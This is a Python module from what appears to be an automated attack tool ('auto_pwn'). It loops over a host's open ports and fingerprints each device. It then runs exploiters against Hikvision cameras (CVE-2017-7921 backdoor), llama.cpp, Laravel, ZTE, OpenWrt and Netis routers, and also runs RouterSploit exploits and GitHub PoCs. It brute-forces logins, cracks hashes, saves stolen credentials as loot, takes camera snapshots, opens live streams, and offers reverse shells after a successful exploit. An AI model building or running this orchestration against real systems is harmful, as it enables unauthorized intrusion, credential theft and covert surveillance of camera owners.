"""Per-port attack loop — fingerprint, CVE, exploits, deep scan, nuclei."""

from __future__ import annotations

import json
import os

from engines.auto_pwn.constants import CAMERA_DEVICE_TYPES, ROUTER_DEVICE_TYPES
from engines.auto_pwn.session import AttackSession
from engines.browser_automation import BrowserAutomation
from engines.camera_viewer import CameraViewer
from engines.credential_hunter import (
    hunt_hikvision_credentials,
    hunt_web_router_credentials,
    parse_ingram_results,
)
from engines.device_cve_checker import assess_device, print_cve_report, probe_hikvision_backdoor
from engines.external_tools import ExternalTools
from engines.fingerprinter import Fingerprinter
from engines.fuzzer_module import Fuzzer
from engines.hikvision_module import HikvisionExploiter
from engines.laravel_module import LaravelExploiter
from engines.llama_cpp_module import LlamaCppExploiter
from engines.loot_report import LootEntry
from engines.utils import input_with_timeout, log, save_success
from engines.zte_module import ZTEExploiter


def _target_url(ip: str, port: int) -> str:
    if port == 443:
        return f"https://{ip}:{port}"
    return f"http://{ip}:{port}"


def _run_manual_menu(session: AttackSession, port: int, target_url: str, ext_tools) -> str | None:
    """Returns 'auto' to switch to full auto, 'skip' to skip port, None when done manual."""
    if os.environ.get("AUTOPWN_GUI") == "1":
        from gui.bridge.input_bridge import install_gui_bridge

        install_gui_bridge()
    ip = session.ip
    print("\n" + "-" * 45)
    print(f"  EXPERT MANUAL MENU for {ip}:{port}")
    print("-" * 45)
    print("  [1] Nuclei Scan      (Web Vulnerabilities)")
    print("  [2] RouterSploit     (Exploit Routers)")
    print("  [3] Ingram           (Scan Cameras/DVRs)")
    print("  [4] Web Brute-force  (Try LuCI/OpenWrt login)")
    print("  [5] Laravel Exploit  (Dump .env secrets)")
    print("  [6] Skip this port   (Go to next port)")
    print("  [0] Auto-Pwn         (Run everything automatically)")
    log("Phase 4: Deep Scan", "INFO")
    print("  [1] RouterSploit (Exploits)  [2] Ingram (Cameras)  [0] Skip")
    deep_choice = input("[?] Choose: ").strip()
    if deep_choice == "1":
        vulns = ext_tools.run_routersploit_scan()
        if vulns:
            log(f"Detected {len(vulns)} potential vulnerabilities!", "WARNING")
            for v in vulns:
                if input(f"[?] Exploit {v} now? (y/n): ").strip().lower() == "y":
                    ext_tools.run_routersploit_exploit(v)
    elif deep_choice == "2":
        ext_tools.run_ingram_scan()
    print("-" * 45)

    choice = input("[?] Choose Tool ID to run: ").strip()
    if choice == "1":
        session.scanner.scan(target_url)
    elif choice == "2":
        vulns = ext_tools.run_routersploit_scan()
        if vulns:
            for v in vulns:
                if input(f"[?] Exploit {v} now? (y/n): ").strip().lower() == "y":
                    ext_tools.run_routersploit_exploit(v)
    elif choice == "3":
        ext_tools.run_ingram_scan()
    elif choice == "4":
        BrowserAutomation(session.ip, port).auto_login_openwrt(session.all_passwords)
    elif choice == "5":
        Fuzzer(session.ip, port).scan_env()
    elif choice == "6":
        return "skip"
    elif choice == "0":
        return "auto"
    log(f"Manual task finished on port {port}.", "SUCCESS")
    return "skip"


def _run_specialized(
    session: AttackSession,
    port: int,
    target_url: str,
    device_type: str,
    device_model: str,
    ext_tools,
    auto_browser: BrowserAutomation,
) -> tuple[str, str, bool, bool]:
    """Returns updated device_type, device_model, router_pwned, camera_handled."""
    ip = session.ip
    loot = session.loot
    router_pwned = session.router_pwned
    camera_handled = session.camera_handled
    all_users = session.all_users
    all_passwords = session.all_passwords

    flags = {
        "LARAVEL": device_type == "LARAVEL",
        "HIKVISION": device_type == "HIKVISION",
        "ZTE": device_type == "ZTE",
        "DAHUA": device_type == "DAHUA",
        "LLAMA_CPP": device_type == "LLAMA_CPP",
        "OPENWRT": device_type == "OPENWRT",
        "NETIS": device_type == "NETIS",
    }
    if not any(flags.values()):
        return device_type, device_model, router_pwned, camera_handled

    log(f"High-Value Target Detected ({device_type}). Running specialized exploiters FIRST...", "PWN")

    if flags["LLAMA_CPP"]:
        if LlamaCppExploiter(ip, port).run_exploit():
            loot.add_note(f"CVE-2026-34159: Potential llama.cpp RCE exploit sent on port {port}.")
            save_success(ip, f"llama.cpp ({port})", "CVE-2026-34159 RCE payload delivered")
            if not session.manual_mode:
                from engines.reverse_shell_prompt import offer_reverse_shell
                offer_reverse_shell(f"llama.cpp CVE-2026-34159 (port {port})", ip)

    if flags["LARAVEL"]:
        lex = LaravelExploiter(target_url)
        if lex.dump_env():
            all_passwords.extend(lex.passwords)

    if flags["HIKVISION"]:
        camera_handled = True
        hexp = HikvisionExploiter(target_url)
        hik_users, hik_passwords = hexp.run_backdoor()
        all_users.extend(hik_users)
        for pw in reversed(hik_passwords):
            if pw not in all_passwords:
                all_passwords.insert(0, pw)
        for cred in ext_tools.search_default_creds("hikvision"):
            if cred["pass"] not in all_passwords:
                all_passwords.append(cred["pass"])

        t_dir = f"targets/{ip}"
        loot.add_file(f"{t_dir}/configurationFile")
        loot.add_file(f"{t_dir}/live_snapshot.jpg")

        cred_entry = hunt_hikvision_credentials(ip, hik_users, all_passwords, port)
        if cred_entry:
            cred_entry.model = cred_entry.model or device_model
            loot.add(cred_entry)
            save_success(ip, f"Hikvision ({port})", f"{cred_entry.username}:{cred_entry.password}")
        else:
            loot.add(
                LootEntry(
                    ip=ip, port=port, device_type="HIKVISION", model=device_model,
                    username=hik_users[0] if hik_users else "admin",
                    password="(see backdoor access below)",
                    auth_method="CVE-2017-7921 bypass only",
                    extra={"backdoor_login": "admin:11 (NOT real password)"},
                )
            )
            loot.add_note("Backdoor admin:11 — real password may differ; use Router Scan cred hunt.")

        use_backdoor = not cred_entry and getattr(hexp, "backdoor_active", False)
        if cred_entry:
            device_intel = assess_device(ip, port, "HIKVISION", device_model, auth=(cred_entry.username, cred_entry.password))
            print_cve_report(device_intel)
        cam_user = cred_entry.username if cred_entry else (hik_users[0] if hik_users else "admin")
        cam_pass = cred_entry.password if cred_entry else (hik_passwords[0] if hik_passwords else "11")
        cam = CameraViewer(ip, cam_user, cam_pass, use_backdoor_auth=use_backdoor)
        cam.discover_channels()
        for p in cam.take_snapshots():
            loot.add_file(p)
        cam.open_in_vlc(use_sub_stream=True)
        if getattr(hexp, "backdoor_active", False) and not session.manual_mode:
            from engines.reverse_shell_prompt import offer_reverse_shell
            offer_reverse_shell(f"Hikvision backdoor CVE-2017-7921 (port {port})", ip)

    if flags["ZTE"]:
        ZTEExploiter(target_url).run_exploit()
        ext_tools.run_routersploit_scan()

    if flags["OPENWRT"]:
        log("OpenWrt/LuCI Device Detected! Running automated login attempts...", "SUCCESS")
        for pw in all_passwords:
            if auto_browser.auto_login_openwrt(target_url, pw):
                loot.add(LootEntry(
                    ip=ip, port=port, device_type="OPENWRT", model=device_model,
                    username="admin", password=pw, auth_method="LuCI web login",
                ))
                save_success(ip, "OpenWrt Web", f"admin:{pw}")
                router_pwned = True
                break
        ext_tools.run_routersploit_scan()

    if flags["NETIS"] and router_pwned:
        log("Netis router pwned — skipping slow deep scan.", "SUCCESS")
    elif flags["NETIS"] and not router_pwned:
        router_entry = hunt_web_router_credentials(ip, port, device_type)
        if router_entry:
            router_entry.model = router_entry.model or device_model
            loot.add(router_entry)
            save_success(ip, f"Netis ({port})", f"{router_entry.username}:{router_entry.password}")
            router_pwned = True

    if flags["DAHUA"]:
        camera_handled = True
        cam = CameraViewer(ip, all_users[0], all_passwords[0])
        cam.discover_channels()
        cam.take_snapshots()
        cam.open_in_vlc(use_sub_stream=True)

    session.all_users = all_users
    session.all_passwords = all_passwords
    return device_type, device_model, router_pwned, camera_handled


def _run_os_cve_phase(session: AttackSession, target_url: str, os_family: str, os_details: str, device_type: str):
    if os_family == "UNKNOWN_OS" or device_type not in ("WINDOWS", "LINUX", "MACOS", "UNIX"):
        return
    log(f"=== OS EXPLOIT PHASE: {os_family} ({os_details}) ===", "PWN")
    from core.paths import project_root

    try:
        cve_db_path = os.path.join(project_root(), "data", "latest_cves.json")
        if not os.path.exists(cve_db_path):
            log("Dynamic CVE database not found. Run cve_updater.py first.", "WARNING")
            return
        with open(cve_db_path, encoding="utf-8") as fh:
            all_cves = json.load(fh)
        os_cves = all_cves.get(os_family, []) + all_cves.get("GENERIC", [])
        if not os_cves:
            log(f"No CVE templates found for OS: {os_family}.", "INFO")
            return
        log(f"Found {len(os_cves)} CVE templates for {os_family}. Running Nuclei targeted scans...", "INFO")
        os_hits = 0
        for cve_entry in os_cves:
            for tmpl in cve_entry.get("nuclei_templates", []):
                finding = session.scanner.scan_specific_template(target_url, tmpl)
                if finding:
                    os_hits += 1
                    tid = finding.get("template-id", tmpl) if isinstance(finding, dict) else str(finding)
                    session.loot.add_note(f"OS CVE HIT ({os_family}): {tid} — {cve_entry.get('title', '')}")
                    log(f"OS EXPLOIT SUCCESS: {tid}", "PWN")
        if os_hits:
            log(f"Total OS vulnerabilities confirmed: {os_hits}", "PWN")
        else:
            log(f"No confirmed OS vulnerabilities on {session.ip}.", "INFO")
    except Exception as exc:
        log(f"OS CVE exploitation error: {exc}", "ERROR")


def attack_single_port(session: AttackSession, port: int) -> None:
    ip = session.ip
    loot = session.loot
    target_url = _target_url(ip, port)
    log(f"\n>>> STARTING ATTACK ON PORT: {port} ({target_url}) <<<", "SUCCESS")

    fp_info = Fingerprinter(target_url).identify_details()
    device_type = fp_info["device_type"]
    device_model = fp_info.get("model", "")
    log(f"Detected Device Type: {device_type}", "INFO")
    if device_model:
        log(f"Device Model/Title: {device_model}", "INFO")

    if device_type == "UNKNOWN" and probe_hikvision_backdoor(ip, port):
        device_type = "HIKVISION"
        log("Deep probe: Hikvision backdoor open — CAMERA path.", "INFO")

    is_camera = device_type in CAMERA_DEVICE_TYPES
    is_router = device_type in ROUTER_DEVICE_TYPES
    if is_camera:
        log("Target classified as CAMERA/DVR — camera exploit path.", "INFO")
    elif is_router:
        log("Target classified as ROUTER — router credential path.", "INFO")
    elif device_type == "UNKNOWN":
        log("Device type unknown — camera CVE probes + router creds.", "WARNING")

    os_result = session.scanner.detect_os_with_nmap(ip)
    os_family = os_result.get("os_family", "UNKNOWN_OS")
    os_details = os_result.get("os_details", "")
    if os_family != "UNKNOWN_OS":
        log(f"Operating System Detected: {os_family} ({os_details})", "INFO")
        if device_type == "UNKNOWN" and os_family in ("WINDOWS", "LINUX", "MACOS", "UNIX"):
            device_type = os_family

    cve_auth = None
    best_early = loot.best_entry()
    if best_early and best_early.has_credentials:
        cve_auth = (best_early.username, best_early.password)
    device_intel = assess_device(
        ip, port, device_type, device_model, fp_info.get("server", ""), auth=cve_auth,
    )
    if device_intel.model and not device_model:
        device_model = device_intel.model
    if device_intel.device_type == "HIKVISION" and device_type == "UNKNOWN":
        device_type = "HIKVISION"
        is_camera = True
    print_cve_report(device_intel)
    for assessment in device_intel.assessments:
        if assessment.status in ("CONFIRMED", "LIKELY_VULNERABLE"):
            loot.add_note(f"{assessment.cve_id}: {assessment.status} — {assessment.reason}")

    ext_tools = ExternalTools(ip)
    auto_browser = BrowserAutomation()
    router_pwned = session.router_pwned
    camera_handled = session.camera_handled

    if not session.manual_mode and not is_camera and (is_router or device_type == "UNKNOWN"):
        router_entry = hunt_web_router_credentials(ip, port, device_type)
        if router_entry:
            if router_entry.device_type == "NETIS" or "netis" in (router_entry.model or "").lower():
                device_type = "NETIS"
            device_model = router_entry.model or device_model
            loot.add(router_entry)
            save_success(ip, f"Web ({port})", f"{router_entry.username}:{router_entry.password}")
            if router_entry.password not in session.all_passwords:
                session.all_passwords.insert(0, router_entry.password)
            if router_entry.username not in session.all_users:
                session.all_users.insert(0, router_entry.username)
            router_pwned = True
            log(f"Router credentials found: {router_entry.username}:{router_entry.password}", "PWN")

    if session.manual_mode:
        manual_result = _run_manual_menu(session, port, target_url, ext_tools)
        if manual_result == "skip":
            return
        if manual_result == "auto":
            session.manual_mode = False

    device_type, device_model, router_pwned, camera_handled = _run_specialized(
        session, port, target_url, device_type, device_model, ext_tools, auto_browser,
    )
    _run_os_cve_phase(session, target_url, os_family, os_details, device_type)

    run_rsf = not router_pwned and not is_camera and (is_router or device_type == "UNKNOWN")
    run_ingram = not camera_handled and (
        is_camera or device_type == "UNKNOWN" or port in (554, 8000, 8080, 37777)
    )

    if run_rsf or run_ingram or session.manual_mode:
        log(f"Running Targeted Deep Scan for {device_type}...", "INFO")
        if run_rsf or session.manual_mode:
            for vuln in ext_tools.run_routersploit_scan() or []:
                log(f"!!! VULNERABILITY: {vuln} !!!", "WARNING")
                if ext_tools.run_routersploit_exploit(vuln) and not session.manual_mode:
                    from engines.reverse_shell_prompt import offer_reverse_shell
                    offer_reverse_shell(f"RouterSploit {vuln}", ip)
        if run_ingram or (session.manual_mode and port in (554, 8000, 8080, 37777)):
            ext_tools.run_ingram_scan()
            for ingram_entry in parse_ingram_results(ip):
                loot.add(ingram_entry)
                save_success(ip, "Ingram", f"{ingram_entry.username}:{ingram_entry.password}")
                camera_handled = True

    if not session.manual_mode and not router_pwned and not is_camera and (is_router or device_type == "UNKNOWN"):
        router_entry = hunt_web_router_credentials(ip, port, device_type)
        if router_entry:
            router_entry.model = router_entry.model or device_model
            loot.add(router_entry)
            save_success(ip, f"Web ({port})", f"{router_entry.username}:{router_entry.password}")
            router_pwned = True

    if not session.manual_mode:
        from engines.poc_runner import PoCRunner
        for pr in PoCRunner(ip, port).run_matching(device_type):
            rel = pr.get("rel", os.path.basename(pr.get("script", "?")))
            loot.add_note(f"PoC {rel}: success={pr.get('success', False)}")
            if pr.get("success"):
                from engines.reverse_shell_prompt import offer_reverse_shell
                offer_reverse_shell(f"GitHub PoC {rel}", ip)

    hash_file_path = f"targets/{ip}/hashes.txt"
    if os.path.exists(hash_file_path):
        log(f"Found hash file at {hash_file_path}. Starting Auto-Decryptor...", "INFO")
        from engines.hash_cracker import HashCracker
        cracked = HashCracker(ip).crack_hashes(hash_file_path)
        for pw in cracked or []:
            if pw not in session.all_passwords:
                session.all_passwords.insert(0, pw)
                loot.add_note(f"Auto-Decryptor cracked password: {pw}")
                log(f"Cracked Password Added to Arsenal: {pw}", "PWN")

    if not session.manual_mode and device_intel.assessments:
        log("Phase: CVE-targeted Nuclei scan...", "INFO")
        for f in session.scanner.scan_cve_intel(target_url, device_intel):
            tid = f.get("template-id", "unknown") if isinstance(f, dict) else str(f)
            loot.add_note(f"Nuclei CVE hit: {tid}")

    session.router_pwned = session.router_pwned or router_pwned
    session.camera_handled = session.camera_handled or camera_handled

    skip_full_nuclei = (
        not session.manual_mode
        and (device_type != "UNKNOWN" or router_pwned or camera_handled)
    )
    if skip_full_nuclei:
        log(f"--- ATTACK ON PORT {port} COMPLETED (Auto — skipping full Nuclei) ---", "SUCCESS")
        return

    if device_type != "UNKNOWN" and session.manual_mode:
        if input_with_timeout("[?] Run full Nuclei scan anyway?", timeout=10, default="n") != "y":
            log(f"--- ATTACK ON PORT {port} COMPLETED ---", "SUCCESS")
            return

    session.scanner.scan(target_url)
    log(f"--- ATTACK ON PORT {port} COMPLETED ---", "SUCCESS")


def attack_all_ports(session: AttackSession) -> None:
    for port in session.open_ports:
        attack_single_port(session, port)
